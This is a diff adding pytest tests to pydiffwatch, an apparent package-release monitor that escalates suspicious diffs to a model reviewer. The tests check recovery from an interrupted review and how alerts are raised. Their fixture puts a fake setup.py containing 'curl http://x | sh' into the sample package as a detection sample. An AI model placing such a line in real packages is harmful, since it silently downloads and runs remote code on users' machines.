@@ -422,3 +422,58 @@ def test_a_too_large_row_alerts_once_per_outcome_through_exhaustion_to_a_benign_
     v = conn.execute("SELECT classification, model FROM verdicts WHERE release_id=?", (rid,)).fetchone()
     assert tuple(v) == ("benign", "m") and store.get_stage(conn, "pkg", "1.0.0") == "reviewed"
     assert orchestrator.list_pending(cfg) == [] and len(_alerts(conn, "pkg")) == 2
+
+
+# --- a kill mid-review never loses the release ------------------------------------------------------------
+
+class _Interrupted(_Backend):
+    def complete(self, **kw):
+        raise KeyboardInterrupt
+
+
+def _escalating_release(conn, cfg, rvw):
+    from pydiffwatch import rules
+    art = ArtifactSet("pkg", "1.1", "1.0", "sdist", {"setup.py": b"import os\nos.system('curl http://x | sh')\n"},
+                      {"setup.py": b"from setuptools import setup\nsetup()\n"}, {}, [])
+    orchestrator._process_fetched(cfg, conn, rvw, rules.load_rules(cfg.rules_dir), NewRelease("pkg", "1.1", 5), art)
+
+
+def test_a_kill_during_the_model_call_leaves_the_release_in_the_auto_drain_queue(tmp_path, capsys):
+    from tests.test_pending_queue import _cfg
+    cfg = _cfg(tmp_path)
+    conn = store.connect(cfg); store.init_schema(conn)
+    with pytest.raises(KeyboardInterrupt):
+        _escalating_release(conn, cfg, reviewer.Reviewer(cfg, backend=_Interrupted()))
+    assert store.get_stage(conn, "pkg", "1.1") == "pending_review"
+    [row] = store.pending_reviews(conn)
+    assert row["pending_reason"] == "in_review" and "os.system" in store.review_input(row)
+    be = _Backend()
+    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=be), auto=True)   # the next tick
+    assert len(be.calls) == 1 and store.get_stage(conn, "pkg", "1.1") == "reviewed"
+
+
+def test_an_interrupted_review_the_drain_cannot_finish_gets_the_first_park_alert(tmp_path, capsys):
+    from tests.test_pending_queue import _cfg
+    cfg = _cfg(tmp_path)
+    conn = store.connect(cfg); store.init_schema(conn)
+    with pytest.raises(KeyboardInterrupt):
+        _escalating_release(conn, cfg, reviewer.Reviewer(cfg, backend=_Interrupted()))
+    assert _alerts(conn, "pkg") == []
+    rvw = reviewer.Reviewer(cfg, backend=_Backend(fail=_REFUSED))
+    for _ in range(2):
+        orchestrator.drain_pending(cfg, conn, rvw, auto=True)
+    assert [k for (k,) in _alerts(conn, "pkg")] == ["pkg|1.1|suspicious-heuristic"]
+    assert store.pending_reviews(conn)[0]["pending_reason"] == "endpoint_unreachable"
+
+
+@pytest.mark.parametrize("reply, alerts", [("benign", []), ("suspicious", []),
+                                           ("malicious", ["pkg|1.1|malicious"])])
+def test_a_finished_review_sends_no_extra_alert(tmp_path, capsys, reply, alerts):
+    from tests import test_pending_queue as pq
+    cfg = pq._cfg(tmp_path)
+    conn = store.connect(cfg); store.init_schema(conn)
+    be = _Backend()
+    be.complete = lambda **kw: pq._OK.replace('"benign"', f'"{reply}"')
+    _escalating_release(conn, cfg, reviewer.Reviewer(cfg, backend=be))
+    assert [k for (k,) in _alerts(conn, "pkg")] == alerts
+    assert store.pending_reviews(conn) == []
